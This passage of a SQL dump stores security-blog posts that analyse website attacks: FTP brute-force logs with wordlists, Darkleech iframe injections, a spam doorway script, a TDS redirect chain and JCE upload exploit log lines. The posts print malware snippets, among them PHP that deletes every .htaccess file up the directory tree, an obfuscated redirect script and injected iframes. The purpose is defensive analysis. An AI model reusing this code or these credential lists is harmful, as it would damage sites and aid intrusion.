second:second_level_domainsecond_level_domainsecond_level_domainsecond_level_domainftpsecond_level_domainrootsecond_level_domainadminsecond_level_domainuserIn this case, the attacker used domain name derivatives (appending words like ftp, admin, user) as usernames,  and the passwords probably matched the usernames (e.g. exampleftp/exampleftp).  A few times they re-tried the same usernames. Probably with slightly different passwords.110.85.113.113,  110.86.165.187, 117.26.118.189, 117.26.119.68 (all from China		        Fuzhou		        Chinanet Fujian Province Network) — 76 login attempts in less than 5 minutes from 4 IPs.00000011111111223312312332112345612345678123456789123654123abc1472581473692222223211233333334444445201314521521555555666666777777888888987654321999999abc123adminadmin111admin123admin222admin321admin333admin444admin555admin666admin777admin888admin999asd123asdasdsecond_level_domainsecond_level_domaintop_level_domaindata123qwe123qwertytestwebweb123wwwwww123zxc123zxcvbnDistributed attackThe last one was obviously a distributed brute force attack where bots from 4 different IPs worked simultaneously and in sync. E.g. one checked “111111” then another checked “112233“, then third checked “222222” and “333333“, then fourth checked “444444“, and so on. Most likely this attack also assumed that some sites may use the same words both as a username and a password.The above three attack took place within 26 hours. Each of them used different approach to choosing usernames and passwords, and they came from different parts of the Internet. It means that there is a real interest in FTP brute force attacks among cyber criminals.Why didn’t I come across such attacks before?After all, brute-force attacks on WordPress and Joomla admin interfaces proved to be very efficient. What makes them so efficient is the fact that there are many millions of WP and Joomla sites out there, and out of those millions there will always be enough sites whose admins were thoughtless enough to choose weak passwords.  That’s why I see hundreds or even thousands of login attempts per day in access logs of almost every WordPress and Joomla site I work with. And unfortunately, some of those site were hacked as a results of the brute force attacks.One might think that FTP is an even better target for brute force attacks since almost every site has FTP access so the number of victims with weak FTP passwords should be substantially larger than the number of WP an Joomla sites with crackable passwords. However it’s not that easy. You should not forget than in case of WP and Joomla, hackers assume that site administrators use the CMS default usernames (admin for WP and administrator for Joomla) so they only need to guess their passwords. But in case of FTP, the username is not known. There is no default FTP username. This is especially true for shared hosting environments where every client must use a unique username. So you need to guess both username and password in order to get access to a site, which dramatically reduces efficiency of brute force attacks (don’t forget the network latency of each FTP request which prevents from testing millions of variants per seconds that one might expect in a latency-free environment).In order to try the brute force approach, hackers need to narrow down their attack to the simplest cases and hope that the Internet is so big that even a tiny fraction of sites with hackable FTP credentials will worth the effort. And the Internet is really big (there are more than 100,000,000 .com domains alone) and to have better results one needs to attacks as many of them as possible, so the set of username/password pairs should be kept as tight as possible to provide results in reasonable time. Based on the above FTP log analysis, the current approach is to target: sites that use their domain name or some easy derivative from a domain name as a username along with a weak password. sites that use the same simple words for both usernames and passwords.Another reason why FTP brute-force attacks are not popular is the FTP logins can be tracked by server administrators who can, for example limit number of consecutive failed login attempts per IP address and then block the offending IPs (for example, using the fail2ban tool).I also guess that many server and client bots might simply lack the FTP brute force functionality…Do you have any better explanation?Why did I see the FTP brute force attacks on that particular site?I have two hypothesis:1. Massive FTP brute force attacks are in the proof of concept stage. A few years ago WordPress brute force attacks were quite rare too, but once criminals figured out that they could be very successful if you had enough resources to attack a large number of site, such attacks went mainstream. So maybe if FTP brute force attacks eventually prove to deliver good results, we’ll see a flood of login attempts in FTP logs of most sites (I hope not).2. In the beginning of the post, I forgot to mention about one more failed login attempt. It used the “anonymous” username and the 66.249.72.181 IP address. The thing is the IP address belongs to Google, more specifically to Googlebot. This means that there are some FTP links (e.g. ftp://example.com ) to that site on the web and Googlebot tries to crawl them using the default anonymous username which normally doesn’t require a password and is used for public FTP sites. Here is the explanation from John Mueller (Webmaster Trends Analyst at Google):When we find links to FTP content, we’ll generally attempt to crawl  those URLs. If they’re publicly accessible and return normal content, we  may choose to index them as well. While it’s not that common, there are  occasionally queries where a file on an FTP server is a good result.So my guess is such attacks may be limited to the sites that have direct FTP links to them on the web.Do you have any better explanation?Just in case. No, the original successful FTP hack that I investigated was not a result of a brute force attack. The username was not obvious and the  password was strong. The attackers used the tried-and-true credential  theft approach.To webmastersRegardless of the chances to see massive FTP brute force attacks in future, the described example should be considered as yet another lesson to all webmasters, who should realize all risks associated with FTP.Carefully choose both username and password.They should not be the sameThe username shoudn’t be easy to guess (e.g.  your site domain name is not the best choice)The password should be strong.Don’t save passwords in FTP programs. Configure them so that they ask for a password every time you connect to your site. If you work with multiple sites and/or don’t like the idea of memorizing many passwords, consider using password managers like KeePass or LastPass — they save your passwords much more securely.Consider using SFTP instead of FTP that sends your passwords in plain  text (they can be easily intercepted, for example, when you use public Wi-Fi). Most popular FTP  programs support SFTP, so the switch should be painless. If you  manage your own server, consider not installing an FTP server  altogether (or uninstalling it now if there are no others users who can’t use SFTP).If you manage a server, consider blocking multiple consecutive failed login attempts at a firewall level (tools like fail2ban may help). Moving FTP to a custom port may also help.Minimize risks of infecting your local computer (which brings you a step closer to password theft). Make sure that all software on your computer is up-to-date. This includes all OS  security updates, all browser updates and all browser plugin updates. Here you can check whether your browser is vulnerable:https://browsercheck.qualys.com/http://www.mozilla.org/en-US/plugincheck/Related posts:10 FTP Clients Malware Steals Credentials FromBeware: FileZilla Doesn’t Protect Your PasswordsWeak Passwords and Tainted WordPress WidgetsIntroduction to Website Parasites﻿                                                                                  Tags: brute-force FTP log analysis                                                    			                                            « Rotating Iframe URLs – One a Minute                Analyzing [Buy Cialis] Search Results »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2013/06/26/ftp-brute-force-attacks/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (21, '“Fancybox for WordPress Has Expired” Infection', 'unmask', '01 Apr 15', 'Loading site search ...          			                “Fancybox for WordPress Has Expired” Infection                          01 Apr 15   Filed in General, Short Attack Reviews, Website exploits                Today I began to notice quite a massive and very unusual attack that leverages vulnerabilities in older versions of the FancyBox for WordPress plugin.As you might know, versions 3.0.2 and older of this plugin allowed anyone to craft special POST requests to /wp-admin/admin-post.php or /wp-admin/admin-ajax.php and change values of specific plugin options in WordPress database. The plugin uses the modified options to build its own JavaScript code. As a result, the malicious content gets injected into generated WordPress pages.A typical malicious injection looks like this:Such attacks use the documented exploit code to inject malicious code into the “padding” value.The exploited vulnerability had been fixed on February 4th. Nonetheless, many blogs failed to update the plugin and hackers routinely find such blogs and infect them.The today’s attack also uses this exploit and modifies the “padding” value, but the code it injects cannot be called malicious:When visitors load such “infected” pages, they see this warning:WARNING: This version of the Fancybox for WordPress plugin has expired! Please upgrade to the latest version!And when they click on the “OK” button, they automatically get redirected to the Fancybox for WordPress changelog page in the official WordPress plugin repository.On one hand, this infection makes blogs unusable since it redirects visitors to WordPress plugin repository before they can read anything. On the other hand, it is very hard to ignore such a warning — if site owners want people to visit their sites they have to upgrade (or remove) the vulnerable version of the plugin ASAP.Now is the time to check if your blog shows such warnings. If you don’t see them, it’s not a reason to relax and wait for such a hard push to upgrade. Make sure all your themes and plugins are up-to-date now.                                                                                   Tags: April1 Fancybox WordPress                                                    			                                            « Darkleech Update – November 2014                            			    Reader\'s Comments (%)       	        			        			Pascal | 02 Apr 2015 8:43 am 						I’m a little suspicious because this article is tagged with “April1″ – though I don’t really see the sense in making this a hoax?', '', 'http://blog.unmaskparasites.com/2015/04/01/fancybox-for-wordpress-has-expired-infection/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (22, 'Darkleech Update – November 2014', 'unmask', '27 Nov 14', 'Loading site search ...          			                Darkleech Update – November 2014                          27 Nov 14   Filed in Short Attack Reviews, Website exploits                Just wanted to document some latest changes in Darkleech behavior that may help you detect it.I’d like to thank internet security enthusiasts who share their findings with me. Without you, I could have easily missed these new (?) details.Quick recapDarkleech is a root level server infection that installs malicious Apache modules. The modules inject invisible iframes into server response when it is already prepared (linebreaks added for readability).<style>.a4on6mz5h { position:absolute; left:-1376px; top:-1819px} </style> <div class=\"a4on6mz5h\"><ifr ame src=\"hxxp://tfmjst .hopto .org/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"247\" height=\"557\"></ifram e></div>All the elements of this code are random and auto-generated on the fly (style name, coordinates, iframe diminsions, URL paths). Moreover, the iframe domains change every few minutes — lately hackers prefer free No-IP.com dynamic DNS hostnames like hopto.org, ddns.net, myftp.biz, myftp.org, serveftp.com, servepics.com, etc.This infection is hard to detect as it only shows up once per IP per day (or maybe even more seldom). And since it works on a low system level, it can detect if server admins are logged in, so it lurks until they log out — this means that they won’t see anything even if they monitor outgoing TCP traffic.For more details, please check the links at the bottom of this post.What’s new?IE=EmulateIE9Recently, I’ve been pointed at the fact that now Darkleech also adds the following meta tag setting IE 9 compatibility mode in Internet Explorer. It looks like it searches for the </head> tag and replaces it with the following code (again, linebreaks added for readability):<meta http-equiv=\'x-ua-compatible\' content=\'IE=EmulateIE9\'></head><style>.syxq9la69 { position:absolute; left:-1666px; top:-1634px} </style> <div class=\"syxq9la69\"><iframe src=\"hxxp://jsnrgo .ddns .net/nsiumkogckv1tv4locfzyv2eykqss9ltfb9wnmhfqz1ol2\" width=\"285\" height=\"554\"></iframe></div>This IE=EmulateIE9 instruction tells modern versions of Internet Explorer to render a web page as if they were IE 9, using all the features that has been deprecated in IE 10 and newer versions of IE. Some of the legacy features are known to have vulnerabilities and hackers try to exploit them turning the compatibility mode on (e.g. VML-related exploit)_SESSION_ID cookieIn addition to temporary IP blacklisting, Darkleech also uses the _SESSION_ID cookie that expires in one week. It adds the following cookie into response headers:Set-Cookie: _SESSION_ID=-1; expires=Wed 03-Dec-2014 09:32:48 GMT; path=/So even if you change your IP address (e.g. if you have a dynamic IP address) you still won’t see malware for the following 7 days. So don’t forget to clear/block cookies if you are trying to reproduce infected response.Most likely the IP blacklisting also works for one week now too.Just a couple of more things:As you might have figured out, it looks for Internet Explorer User-Agent (and derivatives like Maxthon, Avant).Referer is not important at the moment. I managed to trigger it even without the Referer header.That’s it for today. Please let me know if you have some other news about Darkleech.Previous posts about Darkleech:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsWorking With the Darkleech Bitly DataDarkleech + Bitly.com = Insightful Statistics (Sucuri blog)Server Compromises – Understanding Apache Module iFrame Injections and Secure Shell Backdoor (Sucuri blog)                                                                                   Tags: Apache Darkleech EmulateIE9 No-IP                                                    			                                            « Most Contradictive Doorway Generator                “Fancybox for WordPress Has Expired” Infection »            			    Reader\'s Comments (2)       	        			        			WordPress Malware Causes Psuedo-Darkleech Infection | Sucuri Blog | 26 Mar 2015 4:25 pm 						[…] and this is the code from November of 2014 […]                   			        			WordPress Malware Causas Psuedo-Darkleech Infección | Sucuri Español | 13 Apr 2015 10:41 pm 						[…] y este es el código de noviembre de 2014: […]', '', 'http://blog.unmaskparasites.com/2014/11/27/darkleech-update-november-2014/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (23, 'Most Contradictive Doorway Generator', 'unmask', '12 Sep 14', 'Loading site search ...          			                Most Contradictive Doorway Generator                          12 Sep 14   Filed in Short Attack Reviews                Check this thread on WordPress.org forum. The topic starter found a suspicious PHP file and asked what it was doing.The code analysis shows that it’s some sort of a spammy doorway. But it’s a very strange doorway and the way that it works doesn’t make sense to me.First of all, this script has a random text and code generator. The output it generates is [kind of] always unique. Here is a couple of output pages:http://pastebin.com/ymwMZMWPhttp://pastebin.com/Y6B7WM2T...<title>Is. Last spots brows: Dwelling. Immediately moral.</title></head><body>listend40721<span>Flowerill merry chimes - has: Her - again spirits they, wooers. Delight preserve. For he. Free - snow set - grave lapped, icecold made myself visitings allow, beeves twas. Now one:...We usually see such a random text, when spammers want search engines to index “unique” content with “right” keywords. But…1. the script returns the page with the 404 not found code.header(\"HTTP/1.1 404 Not Found\");so the page won’t be indexed by search engines.2. The obfuscated JavaScript code at the bottom of the generated page redirects to a pharma site after about a second.function falselye() { falselya=29; falselyb=[148,134,139,129,140,148,75,145,140,141,75,137,140,128,126,145,134,140,139,75,133,143,130,131,90,68,133,145,145,141,87,76,76,145,126,127,137,130,145,138,130,129,134,128,126,143,130,144,75,130,146,68,88];falselyc=\"\"; for(falselyd=0;falselyd<falselyb.length;falselyd++) { falselyc+=String.fromCharCode(falselyb[falselyd]-falselya); } return falselyc; } setTim eout(falselye(),1263);decodedwindow.top.location.href=\'hxxp://tabletmedicares .eu\';Update: on another site the script redirected to hxxp://uanlwkis .com (also pharma site), which was registered only a few days ago on Sept 6th, 2014.But the generated text has no pharma keywords. One more hint that it’s not for search engines. Maybe it’s an intermediary landing page of some email spam campaign that just needs to redirect visitors? I saw many such landing pages on hacked sites. But it most cases they looked like the decoded version of the script — just a redirection code. Indeed why bother with sophisticated random page generator if no one (neither humans nor robots) is going to read it?3. There is also this strange piece of code:$s=\'/\';if (strtolower(substr(PHP_OS,0,3))==\'win\') $s=\"\\\\\\\\\";$d=array(\".$s\");$p=\"\";for($i=1; $i<255; $i++){$p.=\"..$s\";if (is_dir($p)){array_push($d,$p);}else{break;}}foreach($d as $p){$a=\"h\".\"tac\".\"c\".\"es\".\"s\";$a1=$p.\".$a\";$a2=$p.$a;$a3=$p.\"$a.txt\";@chmod($a1,0666);@unlink($a1);@chmod($a2,0666);@unlink($a2);@chmod($a3,0666);@unlink($a3);}What it does it tries to find an delete(!) all file with names .htaccess, htaccess and htaccess.txt in the current directory and all(!) the directories above the current.That just doesn’t make sense. Why is it trying to corrupt websites? I would understand if it only removed its own files and injected code in legitimate files, but it tries to just remove every .htaccess (and its typical backups) without checking what’s inside. That’s a really disruptive and annoying behavior given that many sites rely on the settings in .htaccess (e.g. most WordPress and Joomla sites).It’s indeed a most contradictive doorway generator that I ever seen. I can’t find any good explanation why it does things the way it does. Maybe you have any ideas?Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for SpammersHtaccess Redirect to Example.ru/dir/index.phpIntroduction to Website Parasites                                                                                  Tags: doorway htaccess redirect                                                    			                                            « Google -> Doorway -> Google -> Spam                Darkleech Update – November 2014 »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/09/12/most-contradictive-doorway-generator/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (24, 'Google -> Doorway -> Google -> Spam', 'unmask', '11 Jun 14', 'Loading site search ...          			                Google -> Doorway -> Google -> Spam                          11 Jun 14   Filed in Uncategorized                Just a few thoughts about an interesting behavior of a black-hat SEO doorway.Typically hackers create doorways on compromised sites to make search engines rank them for certain keywords and then, when searchers click on the links in search results, those doorways redirect them further to a site that hackers really promote. Sometime that redirect may go through some TDS (traffic directing service) but the whole scheme remains pretty much the same:Search results -> doorway -> beneficiary siteToday, when doing a backlink research of one of such pharma doorways, I encountered a different scheme — a one with a loop.The doorway had this URL structure:http://www.hacked-site.com/blog/?prednisolone-without-prescriptionWhen I checked it in Unmask Parasites or in Google cache, I saw spammy content with links to doorways on other hacked sites. Quite typical.When I opened that page in a web browser, it redirected to a TDShxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&gdw=w-48&gdf=%2F90dc16aaf3e24ea68c94c3f784a37ff9-f08f149982bf04ffaa308aba00b2d569.txt&host=www.hacked-site.com&kw=prednisolone%20without%20prescription&HTTP_REFERER=https%3A%2F%2Fwww.google.com%2F%3Fsource%3Dnoref%26q%3Dprednisolone%2520without%2520prescriptionCloaking and conditional redirects to traffic directing services are also quite typical for doorways.Then TDS made another hop:hxxp://bh2r3gof .biz/sutra/in.cgi?5&from=90dc16aaf3e24ea68c94c3f784a37ff9&seoref=8bB06MP5xFTR3TkqmNILbbW5mW30f%2B%2FMiQdbatwxiv5CUUTkQjEO75VtTs7IRqdVTmPfmX……..2FIXHlBdqV6iDd1ruYQMhqmYVCozdkTrAN76fOABiczAnd then I ended up on … Google:http://www.google.com/search?q=prednisolone+without+prescriptionAnd that is not very typical. But interesting.One one hand, it looks like the spammers didn’t consider me as a target traffic (probably because of my IP) and redirected back to the Google search results page for the same query that I supposed to be using when found that site. For some, this chain of redirects may look as if they clicked on a search result and then Google thought for some time and reloaded the same page, which may look like just a glitch.On the other hand, it looks like a second level of search engine optimization, when spammers fine tune a search query that may return better doorways. I can’t help thinking about this because when I see the search results on Google pages that the TDS redirects me to, I realize that most of them are doorways on hacked sites (yes, including those with fake stars in ratings).I know, it’s quite pointless. Why redirect people who already clicked on your doorway to a new set of search results? Although those results may contain some of your other doorways, there is no guarantee that the searcher will not go away or click on them and not on links of your competitors? And you can’t control Google search results — it may happen that there will be no your doorways on the results page.OK. Let’s try to think as the TDS owners. The TDS recognizes the traffic that it doesn’t need for the pharma campaign. It mayredirect it to pharma landing pages anyway (which may decrease the quality and the price of such a traffic)dispose of that traffic altogether (redirect it to a neutral third-party site, like Google)try to monetize that traffic anyway — redirect it to some scam site, porn site, malware site or any other resource that knows how to take advantage of low quality traffic.<warning:unfounded speculation>But what it the spammers also run another campaign that targets the traffic that doesn’t fit their pharma campaign? They can simply redirect the traffic to landing pages of the second campaign. But such traffic will not be targeted. People searched for different things. So maybe it is worth it to “re-target” the traffic and redirect the searchers to a Google result page for keywords relevant to that second campaign and that contains links to their doorways.Here’s the scenario:People search something on Google and click on some result. For some reason Google reloads the page and shows them completely different results for a different query. Some searchers will definitely leave (don’t worry, this was unwanted traffic anyway) but some may become interested in what Google offers them and click on results (after all spammers usually promote something that people need and if it comes from Google it looks more legit). So, instead of either lost or untargeted traffic, they get targeted traffic of people who willingly clicked on search results. All they need to do is make sure their doorways dominate for relevant search queries (shouldn’t be hard since the TDS provide the search query itself and there is no need to rank for short generic queries.)</warning:unfounded speculation>OK, enough speculations. That particular campaign was not using the second level Google optimization. It simply dumped unneeded traffic back to Google. When opening the same doorways from different country IPs, the TDS redirected me to a random “Canadian Pharmacy” site from its pool of about a dozen of sites.Anyway, the point of this post is despite of Matt Cutts’ recent announcement of rolling out the second ranking update for “very spammy queries” I still see that 50% or more of top search results for pharma keywords still point to doorways on hacked sites.This past weekend we started rolling out a ranking update for very spammy queries: http://t.co/NpUZRqpnBI— Matt Cutts (@mattcutts) May 21, 2014And as long as “very spammy queries” return “very spammy results”, there will be incentive for black hat SEOs to hack sites and create doorways there.Related posts:Analyzing [Buy Cialis] Search ResultsRich Snippets in Black Hat SEOCareless Webmasters as WordPress Hosting Providers for Spammers“Cheap Vista” or Cloaked Spam on High-Profile SitesIntroduction to Website Parasites                                                                                  Tags: black hat seo doorway TDS                                                    			                                            « Working With the Darkleech Bitly Data                Most Contradictive Doorway Generator »            			    Reader\'s Comments (2)       	        			        			SearchCap: Google PayDay Loan 3.0, Bing Ads URL Tagging & World Cup Fever | 12 Jun 2014 9:14 pm 						[…] Google -> Doorway -> Google -> Spam, Unmask Parasites. Blog. […]                   			        			Rosanne & Jerry Shalf | 03 Dec 2014 6:27 pm 						I keep getting redirected to a Canadian drugstore site when I type in ashlandmuseum.org. Before the Canadian drugstore site pops up I see something that looks like tds….etc. but it quickly moves to the Canadian site, so I don’t know the complete set of letters.  I have a macbook pro 2012 and am using Maverick 10.9.5 OS.  It doesn’t always happen, which is weird, and it only happens on my computer, not others.  It happens when I use Firefox and Safari.  How do I get rid of it?  I had Applecare go through the machine and we got rid of various viruses, but we couldn’t fix this one.  Applecare said it was because of something Google did and only Google can fix, but I can’t figure out how to reach Google and ask for help.  Please, somebody, help me!!', '', 'http://blog.unmaskparasites.com/2014/06/11/google-doorway-google-spam/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (25, 'Working With the Darkleech Bitly Data', 'unmask', '10 Feb 14', 'Loading site search ...          			                Working With the Darkleech Bitly Data                          10 Feb 14   Filed in General                Data Driven Security took the time to analyze the raw data that I published in my recent post on Sucuri blog about how I used Bitly data to understand the scale of the Darkleech infection.In their article, they have a few questions about data formats, meaning of certain fields and some inconsistencies, so I’ll try to answer their questions here and explain how I worked with the data.So I needed to get information about all the links of the “grantdad” bitly account.I checked the API and somehow missed the “link_history” API request (it was the first time I worked with the bitly API), so I decided to screenscrape the web pages where bitly listed the links creaded by grantdad. 1,000 pages with 10 links on each. Since pages didn’t contain all the information I needed I only collected the short links so that I could use them later in API calls to get more detailed information about each of them.As you can see I was limited with the 10,000 links that bitly made available via their web interface. Not sure if I could get more links via that link_history API. Right now it returns “ACCOUNT_SUSPENDED” and when it was not suspended, API calls for known links beyond those 10,000 produced various errors.When I compiled my list of 10,000 links I used the following API calls to get information about each of the links:Referring domainsAPI:link/referring_domains — for each link, it returned a list of domains referring traffic to this link (in our case sites, containing the iframes) along with the number of clicks from each domain. This helped me compile this list of iframe loads per domain: http://pastebin.com/HYaY2yMb. Then I tried to resolve each of the domain names and created this list of infected domains per IP address: http://pastebin.com/Gxr51Nc1.I also used this API call to get number of iframe loads for each bitly link.InfoAPI:link/info – this gave me timestamps of the links and their long URLs (the rest information was not interesting for my research). Unfortunately, this particular API call is poorly documented so I can only guess what this timestamp mean. It is actually called “indexed“. But I guess it’s the time when the link was created. It is definiteley not the time of the first click because there were no registered clicks for many of the links. As a result, I compiled these datasets:http://pastebin.com/UmkDZZp0http://pastebin.com/w7Kq3ybV ,which contain tab separated values of “bitly link id”, “timestamp”, “# of clicks/iframe loads”, and “long URL”.At that point, I already had the number of iframe loads from the previous step (“link/referring_domains“). Then, for readability, I converted the numeric timestamp using this Python function datetime.datetime.fromtimestamp(). However, you can notice that the second dataset (for January 28th) has a different date format. Instead of “2014-01-25 19:10:07” it uses “Jan 28 23:10:19“. Why? Because of pastebin.com. Because it doesn’t allow unregistered users to post more than 500Kb of data (I deliberately post such data as a guest). Removing the year from the date allowed me to save 4 bytes on each row and fit the dataset in 500Kb.Actually this 500Kb limit is the reason why I have separate pastebins for each date and only specify bitly ids instead of the full bitly links.CountriesAnd finally, API:link/countries – for each link, it returned a list of countries referring traffic to this link along with the number of clicks from those countries. This helped me compile this list of iframe loads per country http://pastebin.com/SZJMw3vx.The last dataset Feb 4-5When I wrote my blogpost on February 5th, I noticed that there were new links available on the Bitly.com grantdad acount page. I began to browse pages of his links and figured that most of the links were the same (Jan 25 and 28) but around 1,700 of them were new (late February 4th and the beginning of February 5th). I immediately repeated the same procedure that included screenscraping, and 3 API calls for each new bitly link. After that I created this new dataset http://pastebin.com/YecHzQ1W and updated the rest datasets (domains, countries, etc).Some more detailsIf you check the total numbers in these two datasets (domains) http://pastebin.com/HYaY2yMb and (countries) http://pastebin.com/SZJMw3vx you’ll see the different in total number of iframe loads: 87152 and 87269. I don’t know why. I used the same links just different API calls (referring_domains and countries) and the totals are supposed to be the same. I didn’t save the “per link” data so can’t tell exactly whether it was my error or the bitly API produces slightly inconsistent results. Anyway, the difference is neglectable for my calculations and doesn’t affect the estimations (given that I tried to underestimate when in doubt ).I didn’t check for duplicates that guys from Data Driven security found in my datasets. They must have to do with my screenscraper and the way that Bitly.com displays links in user accounts. The total number of scraped links matched the number of links that Bitly reported for the user. The extra 121 clicks that these duplicates are responsible for are so close to the 117 difference that I mentioned above so I wonder if these numbers somehow connected? Anyway, this shouldn’t affect the accuracy of the estimates either.Building the geo distribution mapFor the map, I used the Geochart from Google visualization. Since the difference in numbers of clicks for the top 3 countries and the lower half of the list was 3 orders of magnitude, I had to re-scale the data so that we could still see the difference between countries with 50 iframe loads and 2 iframe loads.. I used a square of a natural logarithm for thatMath.pow( Math.round( Math.log(i)), 2)This gave me a nice distribution from 0 to 100 and the below map.IFrame Load Geo DistributionSpeculation on the link generationAfter checking the link creation per minute-of-an-hour distribution, Bob Rudis wondered:This is either the world’s most inconsistent (or crafty) cron-job or grantdad like to press ↑ + ENTER alot.I guess, it was neither cron-job nor manual link creation. I think the [bitly] links were created on-demand. So if someone loads a page and Darkleech needs to inject an iframe then it (or rather the server it works with) generates a new bitly link. Given that this malware may lurk on a server, there may be time periods when no malicious code is being injection into any web pages across all the infected servers. At the same time, the bitly links with zero clicks may refer to page loads by various bots (including our own) when the malicious code is injected but the iframe is never loaded. On the other hand, the volume of bitly links with 0 clicks (~35%) suggests that there might really more complex link generation mechanism than a simple “on-demand” approach.Anyway, that’s great when people double check our data and try to find new interesting patterns there. Make sure to let me know (here or on the Sucuri blog) if you find more patterns and inconsistencies, or have any comments on how the Darkleech works.Related posts:Malicious Apache Module Injects IframesRFI: Server-wide iframe injectionsBety.php Hack. Part 2. Black Hats in Action.Introduction to Website Parasites                                                                                  Tags: Bitly Darkleech data statistics                                                    			                                            « Invasion of JCE Bots                Google -> Doorway -> Google -> Spam »            								Comments are closed.', '', 'http://blog.unmaskparasites.com/2014/02/10/working-with-the-darkleech-bitly-data/\n');
INSERT INTO `unmask` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (26, 'Invasion of JCE Bots', 'unmask', '27 Jan 14', 'Loading site search ...          			                Invasion of JCE Bots                          27 Jan 14   Filed in Website exploits                Joomla has been one of the most popular CMS for a long time.  It powers a huge number of sites.  That’s great! The flip side of this fact is Joomla has been very popular for a long time and there are still very many sites that use older versions of Joomla as well as older version of Joomla components. For example, the 1.5.x branch of Joomla (2008-2010) still has a noticeable share in live Joomla sites.Old versions may work well for your site but they have multiple well known security holes, so they are the low hanging fruit for hackers. Let me show this using a real world example.JCE attackThere is a JCE component — a fancy content editor that can be found almost on every Joomla site. It has a well known security hole that allows anyone to upload arbitrary files to a server.You can easily find a working exploit code for this vulnerability.  What it does is:Checks whether a vulnerable version of JCE is installed (2.0.11, 2.0.12, 2.0.13, 2.0.14, 2.0.15, 1.5.7.10, 1.5.7.11, 1.5.7.12, 1.5.7.13, 1.5.7.14)Exploits the bug in the JCE image manager to upload a PHP file with a .gif extenstion to the images/stories directoryThen uses a JSON command to rename the .gif file to *.php.Now you have a backdoor on a server and can do whatever you want with the site.This is how this attack looks in logs (real example):197.205.70.37 - - [23/Jan/2014:16:46:54 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.0\" 200 302 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20 HTTP/1.0\" 200 329 \"-\" \"BOT/0.1 (BOT for JCE)\"197.205.70.37 - - [23/Jan/2014:16:46:55 -0500] \"GET /images/stories/3xp.php HTTP/1.0\" 200 465 \"-\" \"BOT/0.1 (BOT for JCE)\"As I mentioned, JCE is a very popular component and there are still many sites that use old versions of this component. No wonder, hackers are scanning the Internet for such vulnerable sites.  They reworked the exploit code for use in their automated tools that relentlessly test millions of sites, one by another.  These days, I can find multiple requests with the “BOT/0.1 (BOT for JCE)” User-Agent string in logs of almost every site that I check, even in logs of sites that have never had Joomla installed.I’d like to share some interesting statistics of a real site that had been hacked using this JCE hole and then was being routinely reinfected every day.7,409 requests with the User-Agent “BOT/0.1 (BOT for JCE)” that came from 785 different IPs during the period of Dec 24th – Jan 24th (one month)239 requests from 51 unique IP addresses during the last 24 hours4 independent (uploaded different types of backdoors) successful infections during one day.plus, multiple tests for other vulnerabilities.To webmastersAs you can see,  this is something that you can’t neglect or consider an insignificant threat.  It’s silly to hope that hackers won’t find your site. Today hackers have resources to spider the Internet almost as efficiently as Google just about 10 years ago, so there is almost no chance your site will stay unnoticed. The only way to prevent the hacks is to be proactive:  keep all software up-to-date and harden your sites.In case of this particular JCE attack:Make sure to upgrade your Joomla site to the most current version.Upgrade JCE to the latest version. You can find download packages for all the three branches of Joomla here.Protect all file upload directories and all directories that shouldn’t contain .php files. For example, place the following .htaccess file there to prevent execution of PHP files:<Files *.php>deny from all</Files>Try blocking requests with the “BOT/0.1 (BOT for JCE)” User-Agent string.  Of course, this shouldn’t be considered as a real protection. Hackers can change the User-Agent string to whatever they want. But it can help keep some dumb annoying bots away from your site.If, for some reason, you can’t upgrade your site at this moment, consider placing it behind a website firewall that will block any malicious traffic before it reaches your server.  This is something that we call virtual patching in Sucuri CloudProxy.                                                                                  Tags: exploit JCE Joomla                                                    			                                            « Reporting Suspicious Styles                Working With the Darkleech Bitly Data »            			    Reader\'s Comments (8)       	        			        			Jim Walker | 28 Jan 2014 5:47 pm 						Nicely done!The JCI component “problem” and has been a thorn in the Joomla communities side for years.I would go so far as to say that 1/2 of all of the hacked Joomla installations I’m asked to repair are JCE exploit related.As mentioned, simply adding the .htaccess “no execute php” file within the images/stories directory generally does the trick, though upgrading is always best.Personally, for this particular exploit, I prefer the below in my .htaccess file:# This line turns off directory listingsOptions -Indexes# This line forces scripts to load as text.Addhandler text/plain .pl .cgi .php .py .jsp .asp .shtml .shI like how you linked out to Google and known JCE exploits as well.A quality post top to bottom. Kudos!                   			        			Denis | 28 Jan 2014 7:12 pm 						Thanks Jim,That “text/plain” handler also does the trick and covers a broader range of attacks.I don’t want to link directly to exploits. But if you want to find the information, this Google search is enough. At the same time, if there is some new JCE file upload vulnerability, this search will show it too, so the link will remain fresh and useful.                   			        			machineX | 19 Sep 2014 9:05 am 						I just seen it in some logs for the second time. We do not use joomla. But I think your .htaccess code is very useful in preventative measures for sites overall.                   			        			Brian M | 20 Feb 2014 3:10 pm 						I’m curious if you would have any more information on exactly what is allowing the exploit to work? I understand it’s an exploit in code which was in an old version of Joomla, but my vBulletin sites are apparently being exploited by this Bot for JCE script. I do not have any pieces of Joomla installed on the server – at least, not that I’m aware of. Thankfully Microsoft Security Essentials is catching the backdoor/shell script being uploaded to the site and is removing it before they can use it, but it scares me that they’re able to upload the file to my site in the first place. I’ve tried to get help from vBulletin but they brush it off as not being on their end.                   			        			Denis | 11 Jun 2014 5:13 pm 						In case of Joomla JCE, it just uses a bug to upload a PHP file as a 